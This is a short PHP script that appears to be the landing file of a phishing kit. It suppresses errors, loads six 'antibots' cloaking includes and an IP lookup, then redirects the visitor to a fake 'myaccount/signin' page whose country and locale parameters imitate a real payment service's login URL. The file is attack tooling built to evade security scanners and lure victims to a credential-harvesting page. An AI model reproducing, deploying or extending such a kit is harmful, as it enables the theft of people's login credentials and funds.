<?php
session_start();
error_reporting(0);
include "../BOTS/antibots1.php";
include "../BOTS/antibots2.php";
include "../BOTS/antibots3.php";
include "../BOTS/antibots4.php";
include "../BOTS/antibots5.php";
include "../BOTS/antibots6.php";
include('../RGN/functions/get_ip.php');

header("LOCATION: myaccount/signin/?country.x=".$_SESSION['_LOOKUP_CNTRCODE_']."&locale.x=en_".$_SESSION['_LOOKUP_CNTRCODE_']."");
?>